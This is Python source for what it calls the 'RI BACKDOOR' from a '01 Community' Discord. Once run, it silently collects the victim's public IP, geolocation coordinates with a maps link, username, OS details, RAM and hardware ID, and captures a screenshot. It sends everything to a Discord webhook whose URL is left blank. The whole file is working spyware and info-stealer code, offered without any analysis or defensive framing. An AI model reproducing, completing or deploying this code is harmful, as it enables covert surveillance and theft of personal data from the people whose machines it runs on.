import requests
import json
import psutil
import uuid
import discord
import platform
import getpass
import pyautogui
import cv2
import numpy as np

try:
    import GPUtil
except ImportError:
    GPUtil = None

def get_public_ip():
    try:
        response = requests.get('https://api64.ipify.org?format=json')
        data = response.json()
        return data['ip']
    except requests.RequestException as e:
        return str(e)

def get_ip_info(ip):
    try:
        response = requests.get(f'https://ipinfo.io/{ip}/json')
        data = response.json()
        return data
    except requests.RequestException as e:
        return str(e)

def get_hwid():
    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    machine_uuid = uuid.UUID(int=uuid.getnode())
    hwid = f"{mac}-{machine_uuid}"
    return hwid

def get_ram_info():
    ram = psutil.virtual_memory()
    total_ram = ram.total
    used_ram = ram.used
    ram_percent = ram.percent
    return total_ram, used_ram, ram_percent

webhook_url = ""  

os_name = platform.system()
os_version = platform.version()
system_username = getpass.getuser()
public_ip = get_public_ip()
ip_info = get_ip_info(public_ip)
country = ip_info.get('country', 'N/A')
city = ip_info.get('city', 'N/A')
organization = ip_info.get('org', 'N/A')
latitude = ip_info.get('loc', 'N/A').split(',')[0]
longitude = ip_info.get('loc', 'N/A').split(',')[1]
google_maps_link = f"https://www.google.com/maps?q={latitude},{longitude}"

image_url = "https://media.tenor.com/NWplhnOQQWkAAAAC/pirate-flag-pirates.gif"

should_continue = True  

while should_continue:
    screenshot = pyautogui.screenshot()

    screenshot = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)
    _, screenshot_encoded = cv2.imencode('.png', screenshot)
    screenshot_bytes = screenshot_encoded.tobytes()

    total_ram, used_ram, ram_percent = get_ram_info()

    embed = discord.Embed()
    embed.color = 0xffffff
    embed.add_field(name ="*RI BACKDOOR, Made by 01 Community ! Discord : https://discord.gg/9EQSJAm3rf*", value = f"", inline = False)
    embed.add_field(name ="", value = f"", inline = False)
    embed.add_field(name ="**NETWORK INFORMATION :**", value = f"", inline = False)
    embed.add_field(name ="", value=f"``✲ 🍉``*``Adresse IP : {public_ip}``*\n``✲ 🍉``*``Organisation : {organization}``*\n``✲ 🍉``*``Pays : {country}``*\n``✲ 🍉``*``Ville : {city}``*\n``✲ 🍉``*``Latitude : {latitude}``*\n``✲ 🍉``*``Longitude : {longitude}``*\n``✲ 🍉``*``Link : {google_maps_link}``*", inline = False)
    embed.add_field(name ="", value = f"", inline = False)
    embed.add_field(name ="**SYSTEME INFORMATION :**", value = f"", inline = False)
    embed.add_field(name ="", value=f"\n``✲ 💻``*``Nom Ordinateur : {system_username}``*\n``✲ 💻``*``Distribustion : {os_name}``*\n``✲ 💻``*``OS Version : {os_version}``*\n``✲ 💻``*``Total RAM : {total_ram / (1024 ** 3):.2f} GB``*\n``✲ 💻``*``Used RAM : {used_ram / (1024 ** 3):.2f} GB ({ram_percent:.2f}%)``*\n``✲ 💻``*``HWID : {get_hwid()}``*", inline = False)
    
    embed.set_image(url = image_url)

    files = {'Screenshot': screenshot_bytes}
    message = {
        "content": "||@everyone||",
        "embeds": [embed.to_dict()]
    }
    response = requests.post(webhook_url, data = {'payload_json': json.dumps(message)}, files = files)

    if response.status_code == 204:
        print("")
    else:
        print(f"")

    should_continue = False